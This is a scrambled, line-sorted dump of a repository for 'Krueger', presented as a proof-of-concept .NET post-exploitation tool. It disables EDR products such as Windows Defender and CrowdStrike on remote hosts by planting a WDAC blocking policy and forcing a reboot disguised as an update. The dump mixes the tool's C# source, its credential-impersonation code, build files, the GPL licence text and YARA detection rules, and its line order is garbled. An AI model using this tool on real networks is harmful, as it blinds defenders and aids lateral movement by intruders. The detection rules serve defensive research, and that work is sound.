@@ -1,0 +1,1008 @@
+    
+                
+                            Preamble
+                            domain = Domain.GetCurrentDomain().Name
+                            impersonationContext = WindowsIdentity.Impersonate(intPtr)
+                            return
+                            string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message
+                        IntPtr intPtr = IntPtr.Zero
+                        else
+                        if (logon)
+                        if(domain == null)
+                        return null
+                        {
+                        }
+                       TERMS AND CONDITIONS
+                     END OF TERMS AND CONDITIONS
+                    GNU GENERAL PUBLIC LICENSE
+                    catch
+                    else
+                    if(username != null 
+                    return
+                    return memoryStream.ToArray()
+                    stream.CopyTo(memoryStream)
+                    try
+                    {
+                    }
+                Help()
+                Modules.ArgParse.Execute(args)
+                WindowsImpersonationContext impersonationContext = null
+                bool warn = Convert.ToBoolean(prompt)
+                byte[] policy = Modules.Policy.ReadPolicy()
+                else
+                if (args.Contains(flag))
+                if (args.Contains(option))
+                if (cmd == null)
+                if (host == null)
+                if (rebooted)
+                if (stream == null)
+                if (username != null 
+                impersonationContext.Undo()
+                return false
+                string domain = null
+                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message
+                string host = null
+                string password = null
+                string prompt = null
+                string username = null
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                }
+            Console.WriteLine(help)
+            How to Apply These Terms to Your New Programs
+            ShutdownReason dwReason
+            bool shutdown = false
+            byte[] fileBytes = GetEmbeddedResourceBytes(resourceName)
+            catch (Exception e)
+            else
+            else if (args.Length > 0)
+            foreach (string flag in flags)
+            foreach (string option in options)
+            if (!shutdown)
+            if (warn)
+            ref IntPtr phToken
+            return cmd
+            return fileBytes
+            return true
+            string help =
+            try
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+            var assembly = Assembly.GetExecutingAssembly()
+            {
+            }
+            }   
+        )
+        LOGON32_PROVIDER_WINNT50 = 3
+        SHTDN_REASON_LEGACY_API = (SHTDN_REASON_MAJOR_LEGACY_API 
+        SHTDN_REASON_VALID_BIT_MASK = 0xc0ffffff
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool LogonUser(
+        public static byte[] ReadPolicy()
+        public static extern bool InitiateSystemShutdownEx(
+        public static void Execute(string[] args)
+        public static void Help()
+        static byte[] GetEmbeddedResourceBytes(string resourceName)
+        static void Main(string[] args)
+        {
+        }
+      < 
+    (at your option) any later version.
+    7.  This requirement modifies the requirement in section 4 to
+    </startup>
+    <AssemblyName>Krueger</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{022E5A85-D732-4C5D-8CAD-A367139068D8}</ProjectGuid>
+    <RootNamespace>Krueger</RootNamespace>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <one line to give the program's name and a brief idea of what it does.>
+    <program>  Copyright (C) <year>  <name of author>
+    <startup> 
+    Appropriate Legal Notices
+    Copyright (C) <year>  <name of author>
+    Corresponding Source along with the object code.  If the place to
+    Corresponding Source fixed on a durable physical medium
+    Corresponding Source from a network server at no charge.
+    Corresponding Source in the same way through the same place at no
+    Corresponding Source.  Regardless of what server hosts the
+    GNU General Public License for more details.
+    License to anyone who comes into possession of a copy.  This
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    Notices displayed by works containing it
+    Source of the work are being offered to the general public at no
+    This program comes with ABSOLUTELY NO WARRANTY
+    This program is free software: you can redistribute it and/or modify
+    You should have received a copy of the GNU General Public License
+    [Flags]
+    a) Disclaiming warranty or limiting liability differently from the
+    a) The work must carry prominent notices stating that you modified
+    any liability that these contractual assumptions directly impose on
+    author attributions in that material or in the Appropriate Legal
+    authors of the material
+    available for as long as needed to satisfy these requirements.
+    b) Requiring preservation of specified reasonable legal notices or
+    b) The work must carry prominent notices stating that it is
+    but WITHOUT ANY WARRANTY
+    c) Convey individual copies of the object code with a copy of the
+    charge under subsection 6d.
+    clear directions next to the object code saying where to find the
+    copy of the Corresponding Source for all the software in the
+    customarily used for software interchange.
+    d) Convey the object code by offering access from a designated
+    d) Limiting the use for publicity purposes of names of licensors or
+    e) Declining to grant rights under trademark law for use of some
+    f) Requiring indemnification of licensors and authors of that
+    further charge.  You need not require recipients to copy the
+    internal class ArgParse
+    internal class Interop
+    internal class Policy
+    internal class Program
+    internal class Reboot
+    invalidate such permission if you have separately received it.
+    it under the terms of the GNU General Public License as published by
+    long as you offer spare parts or customer support for that product
+    material by anyone who conveys the material (or modified versions of
+    may be on a different server (operated by you or a third party)
+    more than your reasonable cost of physically performing this
+    public enum LogonProvider
+    public enum LogonType
+    public enum ShutdownReason : uint
+    reasonable ways as different from the original version
+    regardless of how they are packaged.  This License gives no
+    released under this License and any conditions added under section
+    requiring that modified versions of such material be marked in
+    terms of sections 15 and 16 of this License
+    those licensors and authors.
+    under certain conditions
+    with subsection 6b.
+    work need not make them do so.
+    written offer to provide the Corresponding Source.  This
+    you inform other peers where the object code and Corresponding
+    {
+    }
+  0. Definitions.
+  1. Source Code.
+  10. Automatic Licensing of Downstream Recipients.
+  11. Patents.
+  12. No Surrender of Others' Freedom.
+  13. Use with the GNU Affero General Public License.
+  14. Revised Versions of this License.
+  15. Disclaimer of Warranty.
+  16. Limitation of Liability.
+  17. Interpretation of Sections 15 and 16.
+  2. Basic Permissions.
+  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
+  4. Conveying Verbatim Copies.
+  5. Conveying Modified Source Versions.
+  6. Conveying Non-Source Forms.
+  7. Additional Terms.
+  8. Termination.
+  9. Acceptance Not Required for Having Copies.
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+  A compilation of a covered work with other separate and independent
+  All rights granted under this License are granted for the term of
+  Conveying under any other circumstances is permitted solely under
+  Developers that use the GNU GPL protect your rights with two steps:
+  Each version is given a distinguishing version number.  If the
+  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  If the Program specifies that a proxy can decide which future
+  If the disclaimer of warranty and limitation of liability provided
+  Later license versions may give you additional or different
+  No covered work shall be deemed part of an effective technological
+  Nothing in this License shall be construed as excluding or limiting
+  Some devices are designed to deny users access to install or run
+  Termination of your rights under this section does not terminate the
+  The Corresponding Source for a work in source code form is that
+  The Corresponding Source need not include anything that users
+  The Free Software Foundation may publish revised and/or new versions of
+  The GNU General Public License does not permit incorporating your program
+  The licenses for most software and other practical works are designed
+  The requirement to provide Installation Information does not include a
+  You are not required to accept this License in order to receive or
+  You may convey a covered work in object code form under the terms
+  You may convey verbatim copies of the Program's source code as you
+  You may not impose any further restrictions on the exercise of the
+  You may not propagate or modify a covered work except as expressly
+  ___// /_/  >  ___/
+ / ___
+ 1])
+ Bytes used for several section headers in WDAC policies 
+ Description
+ Everyone is permitted to copy and distribute verbatim copies
+ Executables descriptions that may be blocked 
+ Executables that may be blocked 
+ MoD
+ ShutdownReason.SHTDN_REASON_MINOR_INSTALLATION)
+ Strings and bytes used to identify an embedded WDAC policy 
+ Test for embedded WDAC policy 
+ Visual Studio Version 17
+ and 
+ and each file should have at least
+ and give all
+ args.Length == 0)
+ e.Message)
+ errorMessage)
+ for details type 
+ host 
+ host)
+ it applies also to
+ password != null)
+ section 10
+ type 
+ without even the implied warranty of
+![image](https://github.com/user-attachments/assets/9d6cc181-972e-4e2a-a5e6-beedd6656685)
+"                            Console.WriteLine(""[!] Error: "" "
+"                            Console.WriteLine($""["
+"                        Console.WriteLine(""[!] For alternative credentials a username and password must be specified"")"
+"                        Console.WriteLine(""[!] Please supply all the valid options, use "
+"                        bool logon = Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref intPtr)"
+"                        cmd.Add(flag, args[Array.IndexOf(args, flag) "
+"                       Version 3, 29 June 2007"
+"                    Console.WriteLine(""[!] Could not trigger reboot"")"
+"                    Console.WriteLine(""[!] Please supply a host: use "
+"                    Console.WriteLine(""["
+"                    cmd.Add(option, ""False"")"
+"                    cmd.Add(option, ""True"")"
+"                    throw new InvalidOperationException($""Resource '{resourceName}' not found."")"
+"                """
+"                ""Krueger.exe [Options]"
+"                ""Options:"
+"                Console.WriteLine(""[!] Error: "" "
+"                Console.WriteLine(""[!] Exception: "" "
+"                Console.WriteLine(""["
+"                Dictionary<string, string> cmd = Parse(args, flags, options)"
+"                File.WriteAllBytes(target, policy)"
+"                bool rebooted = Reboot.reboot(host, warn)"
+"                cmd.TryGetValue(""--domain"", out domain)"
+"                cmd.TryGetValue(""--host"", out host)"
+"                cmd.TryGetValue(""--password"", out password)"
+"                cmd.TryGetValue(""--prompt"", out prompt)"
+"                cmd.TryGetValue(""--username"", out username)"
+"                shutdown = Interop.InitiateSystemShutdownEx(computer, """", 0, true, true, ShutdownReason.SHTDN_REASON_MAJOR_OTHER)"
+"                shutdown = Interop.InitiateSystemShutdownEx(computer, ""System will restart in 2 minutes due to an update."", 120, true, true, ShutdownReason.SHTDN_REASON_MAJOR_OTHER "
+"                string target = @"""
+"                string[] flags = { ""--host"" , ""--username"", ""--password"", ""--domain"" }"
+"                string[] options = { ""--prompt"" }"
+"            Console.WriteLine("" ____  __.                                         "
+"            Console.WriteLine("""
+"            Dictionary<string, string> cmd = new Dictionary<string, string>()"
+"            [MarshalAs(UnmanagedType.LPStr)] string pszDomain,"
+"            [MarshalAs(UnmanagedType.LPStr)] string pszPassword,"
+"            [MarshalAs(UnmanagedType.LPStr)] string pszUserName,"
+"            bool bForceAppsClosed,"
+"            bool bRebootAfterShutdown,"
+"            if (args.Contains(""--help"") "
+"            int dwLogonProvider,"
+"            int dwLogonType,"
+"            string lpMachineName,"
+"            string lpMessage,"
+"            string resourceName = ""Krueger.SiPolicy.p7b"""
+"            uint dwTimeout,"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.7.2"" />"
+"        LOGON32_LOGON_BATCH = 4,"
+"        LOGON32_LOGON_INTERACTIVE = 2,"
+"        LOGON32_LOGON_NETWORK = 3,"
+"        LOGON32_LOGON_NETWORK_CLEARTEXT = 8,"
+"        LOGON32_LOGON_NEW_CREDENTIALS = 9,"
+"        LOGON32_LOGON_SERVICE = 5,"
+"        LOGON32_LOGON_UNLOCK = 7,"
+"        LOGON32_PROVIDER_DEFAULT = 0,"
+"        LOGON32_PROVIDER_WINNT35 = 1,"
+"        LOGON32_PROVIDER_WINNT40 = 2,"
+"        SHTDN_REASON_FLAG_PLANNED = 0x80000000,"
+"        SHTDN_REASON_FLAG_USER_DEFINED = 0x40000000,"
+"        SHTDN_REASON_MAJOR_APPLICATION = 0x00040000,"
+"        SHTDN_REASON_MAJOR_HARDWARE = 0x00010000,"
+"        SHTDN_REASON_MAJOR_LEGACY_API = 0x00070000,"
+"        SHTDN_REASON_MAJOR_NONE = 0x00000000,"
+"        SHTDN_REASON_MAJOR_OPERATINGSYSTEM = 0x00020000,"
+"        SHTDN_REASON_MAJOR_OTHER = 0x00000000,"
+"        SHTDN_REASON_MAJOR_POWER = 0x00060000,"
+"        SHTDN_REASON_MAJOR_SOFTWARE = 0x00030000,"
+"        SHTDN_REASON_MAJOR_SYSTEM = 0x00050000,"
+"        SHTDN_REASON_MINOR_BLUESCREEN = 0x0000000F,"
+"        SHTDN_REASON_MINOR_CORDUNPLUGGED = 0x0000000b,"
+"        SHTDN_REASON_MINOR_DISK = 0x00000007,"
+"        SHTDN_REASON_MINOR_ENVIRONMENT = 0x0000000c,"
+"        SHTDN_REASON_MINOR_HARDWARE_DRIVER = 0x0000000d,"
+"        SHTDN_REASON_MINOR_HOTFIX = 0x00000011,"
+"        SHTDN_REASON_MINOR_HOTFIX_UNINSTALL = 0x00000017,"
+"        SHTDN_REASON_MINOR_HUNG = 0x00000005,"
+"        SHTDN_REASON_MINOR_INSTALLATION = 0x00000002,"
+"        SHTDN_REASON_MINOR_MAINTENANCE = 0x00000001,"
+"        SHTDN_REASON_MINOR_MMC = 0x00000019,"
+"        SHTDN_REASON_MINOR_NETWORKCARD = 0x00000000,"
+"        SHTDN_REASON_MINOR_NETWORK_CONNECTIVITY = 0x00000014,"
+"        SHTDN_REASON_MINOR_NONE = 0x000000ff,"
+"        SHTDN_REASON_MINOR_OTHER = 0x00000000,"
+"        SHTDN_REASON_MINOR_OTHERDRIVER = 0x0000000e,"
+"        SHTDN_REASON_MINOR_POWER_SUPPLY = 0x0000000a,"
+"        SHTDN_REASON_MINOR_PROCESSOR = 0x00000008,"
+"        SHTDN_REASON_MINOR_RECONFIG = 0x00000004,"
+"        SHTDN_REASON_MINOR_SECURITY = 0x00000013,"
+"        SHTDN_REASON_MINOR_SECURITYFIX = 0x00000012,"
+"        SHTDN_REASON_MINOR_SECURITYFIX_UNINSTALL = 0x00000018,"
+"        SHTDN_REASON_MINOR_SERVICEPACK = 0x00000010,"
+"        SHTDN_REASON_MINOR_SERVICEPACK_UNINSTALL = 0x00000016,"
+"        SHTDN_REASON_MINOR_TERMSRV = 0x00000020,"
+"        SHTDN_REASON_MINOR_UNSTABLE = 0x00000006,"
+"        SHTDN_REASON_MINOR_UPGRADE = 0x00000003,"
+"        SHTDN_REASON_MINOR_WMI = 0x00000015,"
+"        SHTDN_REASON_UNKNOWN = SHTDN_REASON_MINOR_NONE,"
+"        [DllImport(""advapi32.dll"", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]"
+"        [DllImport(""advapi32.dll"", SetLastError = true, CharSet = CharSet.Auto)]"
+"        public static Dictionary<string, string> Parse(string[] args, string[] flags, string[] options)"
+"        public static bool reboot(string computer, bool warn)"
+"    ""keep intact all notices""."
+"    (including a physical distribution medium), accompanied by a"
+"    (including a physical distribution medium), accompanied by the"
+"    <Compile Include=""Modules"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <EmbeddedResource Include=""SiPolicy.p7b"" />"
+"    <None Include=""App.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.DirectoryServices"" />"
+"    <Reference Include=""System.Management"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    Corresponding Source, you remain obligated to ensure that it is"
+"    License will therefore apply, along with any applicable section 7"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    a) Convey the object code in, or embodied in, a physical product"
+"    additional terms, to the whole of the work, and all its parts,"
+"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
+"    alternative is allowed only occasionally and noncommercially, and"
+"    b) Convey the object code in, or embodied in, a physical product"
+"    c) Prohibiting misrepresentation of the origin of that material, or"
+"    c) You must license the entire work, as a whole, under this"
+"    conveying of source, or (2) access to copy the"
+"    copy the object code is a network server, the Corresponding Source"
+"    d) If the work has interactive user interfaces, each must display"
+"    e) Convey the object code using peer-to-peer transmission, provided"
+"    interfaces that do not display Appropriate Legal Notices, your"
+"    it) with contractual assumptions of liability to the recipient, for"
+"    it, and giving a relevant date."
+"    medium customarily used for software interchange, for a price no"
+"    model, to give anyone who possesses the object code either (1) a"
+"    only if you received the object code with such an offer, in accord"
+"    permission to license the work in any other way, but it does not"
+"    place (gratis or for a charge), and offer equivalent access to the"
+"    product that is covered by this License, on a durable physical"
+"    that supports equivalent copying facilities, provided you maintain"
+"    the Free Software Foundation, either version 3 of the License, or"
+"    trade names, trademarks, or service marks"
+"    written offer, valid for at least three years and valid for as"
+"  ""Additional permissions"" are terms that supplement the terms of this"
+"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
+"  ""Installation Information"" for a User Product means any methods,"
+"  ""The Program"" refers to any copyrightable work licensed under this"
+"  ""This License"" refers to version 3 of the GNU General Public License."
+"  2024"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  A ""Standard Interface"" means an interface that either is an official"
+"  A ""User Product"" is either (1) a ""consumer product"", which means any"
+"  A ""contributor"" is a copyright holder who authorizes use under this"
+"  A ""covered work"" means either the unmodified Program or a work based"
+"  A contributor's ""essential patent claims"" are all patent claims"
+"  A patent license is ""discriminatory"" if it does not include within"
+"  A separable portion of the object code, whose source code is excluded"
+"  Additional terms, permissive or non-permissive, may be stated in the"
+"  All other non-permissive additional terms are considered ""further"
+"  An ""entity transaction"" is a transaction transferring control of an"
+"  An interactive user interface displays ""Appropriate Legal Notices"""
+"  Corresponding Source conveyed, and Installation Information provided,"
+"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
+"  Each time you convey a covered work, the recipient automatically"
+"  Finally, every program is threatened constantly by software patents."
+"  For example, if you distribute copies of such a program, whether"
+"  For the developers' and authors' protection, the GPL clearly explains"
+"  However, if you cease all violation of this License, then your"
+"  If conditions are imposed on you (whether by court order, agreement or"
+"  If the program does terminal interaction, make it output a short"
+"  If you add terms to a covered work in accord with this section, you"
+"  If you convey a covered work, knowingly relying on a patent license,"
+"  If you convey an object code work under this section in, or with, or"
+"  If you develop a new program, and you want it to be of the greatest"
+"  If, pursuant to or in connection with a single transaction or"
+"  In the following three paragraphs, a ""patent license"" is any express"
+"  Moreover, your license from a particular copyright holder is"
+"  Notwithstanding any other provision of this License, for material you"
+"  Notwithstanding any other provision of this License, you have"
+"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
+"  The ""Corresponding Source"" for a work in object code form means all"
+"  The ""System Libraries"" of an executable work include anything, other"
+"  The ""source code"" for a work means the preferred form of the work"
+"  The GNU General Public License is a free, copyleft license for"
+"  The precise terms and conditions for copying, distribution and"
+"  To ""convey"" a work means any kind of propagation that enables other"
+"  To ""modify"" a work means to copy from or adapt all or part of the work"
+"  To ""propagate"" a work means to do anything with it that, without"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to prevent others from denying you"
+"  When we speak of free software, we are referring to freedom, not"
+"  When you convey a copy of a covered work, you may at your option"
+"  When you convey a covered work, you waive any legal power to forbid"
+"  You may charge any price or no price for each copy that you convey,"
+"  You may convey a work based on the Program, or the modifications to"
+"  You may make, run and propagate covered works that you do not"
+"  You should also get your employer (if you work as a programmer) or school,"
+" ([@anthemtotheego](https://x.com/anthemtotheego)) . Additionally, to prevent the need to load a WDAC policy from disk while executing Krueger from memory, Krueger includes an embedded WDAC policy inside of the .NET assembly inserted at compile time which can be read from memory and written to a target at runtime."
+" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
+" SHTDN_REASON_FLAG_PLANNED),"
+" args.Contains(""-h"") "
+" for a GUI interface, you would use an ""about box""."
+" however, if the Program has interactive"
+" of this license document, but changing it is not allowed."
+""" for more details"")"
+""" for more information"")"
+"""Krueger.exe -h"
+"""Major Component"", in this context, means a major essential component"
+"""aggregate"" if the compilation and its resulting copyright are not"
+"""recipients"" may be individuals or organizations."
+"$blockattr1 = ""CrowdStrike Falcon Sensor"" fullword wide"
+"$blockattr1 = ""Windows Defender Advanced Threat Protection Service Executable"" fullword wide"
+"$blockattr2 = ""Antimalware Service Executable"" fullword wide"
+"$blockattr3 = ""Antimalware Core Service"" fullword wide"
+"$blockdriver1 = ""CSAgent.sys"" fullword wide"
+"$blockexe1 = ""CSFalconService.exe"" fullword wide"
+"$blockexe1 = ""MsSense.exe"" fullword wide"
+"$blockexe2 = ""MsMpEng.exe"" fullword wide"
+"$blockexe3 = ""MsDefenderCoreService.exe"" fullword wide"
+"$policydst1 = """
+"$policydst2 = ""ADMIN$"
+"$s1 = ""Krueger.exe"""
+"$s2 = ""Krueger.SiPolicy.p7b"""
+"$wdac2 = ""_"
+"$wdac3 = ""PTbS"
+"$wdac4 = ""TJ-"""
+"(1) assert copyright on the software, and (2) offer you this License"
+"(if any) on which the executable work runs, or a compiler used to"
+"(kernel, window system, and so on) of the specific operating system"
+",$blockattr"
+",$blockdriver1,$blockattr"
+"// COM, set the ComVisible attribute to true on that type."
+"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
+"AnyCPU' "">"
+"ArgParse.cs"" />"
+"AssemblyInfo.cs"" />"
+"Component, and (b) serves only to enable use of the work with that"
+"Corresponding Source of the work from the predecessor in interest, if"
+"For more information on this, and how to apply and follow the GNU GPL, see"
+"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
+"GNU General Public License, you may choose any version ever published"
+"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
+"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
+"Interop.cs"" />"
+"Krueger is a Proof of Concept (PoC) .NET post-exploitation tool for remotely killing Endpoint Detection and Response (EDR) as apart of lateral movement procedures. Krueger accomplishes this task by utilizing Windows Defender Application Control (WDAC), which is a built in Microsoft created application control utility that has the ability to block code at the user and kernel-mode levels. Using Krueger with administrative permissions over a target remote device, an adversary can quickly place a WDAC policy to disk and perform a remote reboot, preventing the EDR service from starting on boot. "
+"Krueger.csproj"", ""{022E5A85-D732-4C5D-8CAD-A367139068D8}"""
+"License and any other pertinent obligations, then as a consequence you may"
+"License will continue to apply to the part which is the covered work,"
+"License, you may add to a covered work material governed by the terms"
+"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
+"Major Component, or to implement a Standard Interface for which an"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
+"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
+"Policy.cs"" />"
+"Program, unless a warranty or assumption of liability accompanies a"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""Krueger"", ""Krueger"
+"Public License ""or any later version"" applies to it, you have the"
+"Public License instead of this License.  But first, please read"
+"Reboot.cs"" />"
+"SiPolicy.p7b"""
+"System Libraries, or general-purpose tools or generally available free"
+"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""Krueger"")]"
+"[assembly: AssemblyTitle(""Krueger"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""022e5a85-d732-4c5d-8cad-a367139068d8"")]"
+"] Launching attack on "" "
+"] Moved policy successfully"")"
+"] Triggered reboot"")"
+"a computer network, with no transfer of a copy, is not conveying."
+"above cannot be given local legal effect according to their terms,"
+"actual knowledge that, but for the patent license, your conveying the"
+"actually uses, or expects or is expected to use, the product.  A product"
+"add to a covered work, you may (if authorized by the copyright holders of"
+"additional permissions on material, added by you to a covered work,"
+"additional terms that apply to those files, or a notice indicating"
+"agreement or commitment, however denominated, not to enforce a patent"
+"and control, on terms that prohibit them from making any copies of"
+"and which are not combined with it such as to form a larger program,"
+"any patent claim is infringed by making, using, selling, offering for"
+"apply only to part of the Program, that part may be used separately"
+"arrangement, you convey, or propagate by procuring conveyance of, a"
+"author = ""Jonathan Beierle"""
+"authors' sake, the GPL requires that modified versions be marked as"
+"available, or (2) arrange to deprive yourself of the benefit of the"
+"be similar in spirit to the present version, but may differ in detail to"
+"be treated as though they were included in this License, to the extent"
+"but the special requirements of the GNU Affero General Public License,"
+"by this License, of making, using, or selling its contributor version,"
+"certain responsibilities if you distribute copies of the software, or if"
+"changed, so that their problems will not be attributed erroneously to"
+"combined work, and to convey the resulting work.  The terms of this"
+"commercial, industrial or non-consumer uses, unless such uses represent"
+"computer or modifying a private copy.  Propagation includes copying,"
+"consistent with the requirements of this License, to extend the patent"
+"contain the covered work, unless you entered into that arrangement,"
+"content, constitutes a covered work.  This License acknowledges your"
+"control those activities.  However, it does not include the work's"
+"convey, without conditions so long as your license otherwise remains"
+"conveyed by you (or copies made from those copies), or (b) primarily"
+"copyright holder, and you cure the violation prior to 30 days after"
+"copyright on the Program, and are irrevocable provided the stated"
+"covered work in a country, or your recipient's use of the covered work"
+"covered work is covered by this License only if the output, given its"
+"covered work, and grant a patent license to some of the parties"
+"covered work, you indicate your acceptance of this License to do so."
+"description = ""Identifies a Krueger binary"""
+"description = ""Identifies if a compiled WDAC policy references CrowdStrike Falcon details in a potentially malicious manner"""
+"description = ""Identifies if a compiled WDAC policy references Windows Defender details in a potentially malicious manner"""
+"description = ""Identifies if a file is a compiled WDAC policy that enforces blocking rule(s)"""
+"distribution (with or without modification), making available to the"
+"earlier work or a work ""based on"" the earlier work."
+"exact copy.  The resulting work is called a ""modified version"" of the"
+"extent that warranties are provided), that licensees may convey the"
+"feature that (1) displays an appropriate copyright notice, and (2)"
+"finally terminates your license, and (b) permanently, if the copyright"
+"fixed term (regardless of how the transaction is characterized), the"
+"for a work that has been modified or installed by the recipient, or for"
+"for making modifications to it.  ""Object code"" means any non-source"
+"for you must do so exclusively on your behalf, under your direction"
+"form of a separately written license, or stated as exceptions"
+"free programs, and that you know you can do these things."
+"freedoms that you received.  You must make sure that they, too, receive"
+"from the Corresponding Source as a System Library, need not be"
+"give under the previous paragraph, plus a right to possession of the"
+"giving you legal permission to copy, distribute and/or modify it."
+"gratis or for a fee, you must pass on to the recipients the same"
+"hereafter acquired, that would be infringed by some manner, permitted"
+"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
+"import ""pe"""
+"in a country, would infringe one or more identifiable patents in that"
+"in a fashion requiring copyright permission, other than the making of an"
+"in or on a volume of a storage or distribution medium, is called an"
+"in the business of distributing software, under which you make payment"
+"infringement under applicable copyright law, except executing it on a"
+"interfaces specified for a particular programming language, one that"
+"into a dwelling.  In determining whether a product is a consumer product,"
+"into proprietary programs.  If your program is a subroutine library, you"
+"license to downstream recipients.  ""Knowingly relying"" means you have"
+"linked subprograms that the work is specifically designed to require,"
+"machine-readable Corresponding Source under the terms of this License,"
+"make it effectively proprietary.  To prevent this, the GPL assures that"
+"make, use, sell, offer for sale, import and otherwise run, modify and"
+"menu, a prominent item in the list meets this criterion."
+"modification of the work as a means of enforcing, against the work's"
+"modified object code on the User Product (for example, the work has"
+"modified versions of the software inside them, although the manufacturer"
+"modify it is void, and will automatically terminate your rights under"
+"must place, in the relevant source files, a statement of the"
+"not accept this License.  Therefore, by modifying or propagating a"
+"not convey it at all.  For example, if you agree to terms that obligate you"
+"not impose a license fee, royalty, or other charge for exercise of"
+"of having them make modifications exclusively for you, or provide you"
+"of sections 4 and 5, provided that you also convey the"
+"of that license document, provided that the further restriction does"
+"of the GPL, as needed to protect the freedom of users."
+"or convey a specific copy of the covered work, then the patent license"
+"or household purposes, or (2) anything designed or sold for incorporation"
+"or that patent license was granted, prior to 28 March 2007."
+"organization, or merging organizations.  If propagation of a covered"
+"organization, or substantially all assets of one, or subdividing an"
+"otherwise) that contradict the conditions of this License, they do not"
+"owned or controlled by the contributor, whether already acquired or"
+"packaging a Major Component, but which is not part of that Major"
+"parties who would receive the covered work from you, a discriminatory"
+"parts of the General Public License.  Of course, your program's commands"
+"patent license for this particular work, or (3) arrange, in a manner"
+"patent license under the contributor's essential patent claims, to"
+"permission, would make you directly or secondarily liable for"
+"permissions.  However, no additional obligations are imposed on any"
+"possible use to the public, the best way to achieve this is to make it"
+"procedures, authorization keys, or other information required to install"
+"produce it from the Program, in the form of source code under the"
+"produce the work, or an object code interpreter used to run it."
+"product received by a particular user, ""normally used"" refers to a"
+"products.  If such problems arise substantially in other domains, we"
+"propagate that work, subject to this License.  You are not responsible"
+"provisionally, unless and until the copyright holder explicitly and"
+"public, and in some countries other activities as well."
+"publicly available network server or other readily accessible means,"
+"purposes of this definition, ""control"" includes the right to grant"
+"receive it, in any medium, provided that you conspicuously and"
+"received it, or any part of it, contains a notice stating that it is"
+"receives a license from the original licensors, to run, modify and"
+"receiving the covered work authorizing them to use, propagate, modify"
+"reference = ""https://github.com/logangoins/Krueger"""
+"reinstated, you do not qualify to receive new licenses for the same"
+"remove any additional permissions from that copy, or from any part of"
